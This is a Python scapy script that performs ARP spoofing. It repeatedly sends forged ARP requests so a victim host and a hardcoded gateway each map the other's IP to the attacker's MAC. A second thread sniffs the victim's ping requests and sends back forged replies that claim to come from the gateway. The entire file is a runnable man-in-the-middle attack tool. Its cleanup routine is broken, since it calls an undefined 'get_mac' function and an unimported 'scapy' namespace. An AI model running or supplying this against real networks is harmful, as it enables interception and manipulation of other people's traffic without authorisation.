#!/usr/bin/env python3

from scapy.all import *
import os
import time
import threading

# Continuously send ARP spoofing packets to the victim and the default gateway
def arp_spoof():
    sent_packets_count = 0
    while True:
        # Send an ARP request to the victim pretending to be the default gateway
        arp_request = Ether(dst=victim_mac) / ARP(op=1, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=attacker_mac)
        sendp(arp_request ,verbose=False)
        # Send an ARP request to the default gateway pretending to be the victim
        arp_request = Ether(dst=gateway_mac) / ARP(op=1, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=attacker_mac)
        sendp(arp_request, verbose=False)
        sent_packets_count = sent_packets_count + 2                              # two packets sent
        print("\r[*] Packets Sent "+str(sent_packets_count), end="")
        time.sleep(1)

def Lfilter(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet[IP].src == victim_ip: # check if the packet is an ICMP ping request
        return True
    return False
    
def Prn(packet):
    icmp_reply = Ether(dst = victim_mac) / IP(dst = victim_ip, src = gateway_ip) / ICMP(type=0) / packet[ICMP].payload
    return icmp_reply
    
def packet_sniffer():
    while True:
        packets = sniff(iface = conf.iface, count = 1, prn = Prn, lfilter = Lfilter)
        packet = packets[0]
        
def restore(destination_ip, source_ip):                 # restore the ARP cache
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)                   # sends the ARP response packet
    
    
if len(sys.argv) < 2:
    print("Usage: ./arp_spoofing.py [victim_ip]")
    sys.exit()
    
victim_ip = sys.argv[1]
victim_mac = getmacbyip(victim_ip)

gateway_ip = "192.168.0.50"
gateway_mac = getmacbyip(gateway_ip)
attacker_mac = get_if_hwaddr(conf.iface)    
print("gateway\t\t", gateway_mac,"|", gateway_ip)
print("victim\t\t", victim_mac,"|", victim_ip)
print("attacker\t", attacker_mac)

try:
    thread1 = threading.Thread(target = arp_spoof)
    thread2 = threading.Thread(target = packet_sniffer)
    thread1.start()
    thread2.start()
    while True:
        pass
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, victim_ip)
    restore(victim_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
    print("\n[*] ARP cache restored")
    sys.exit()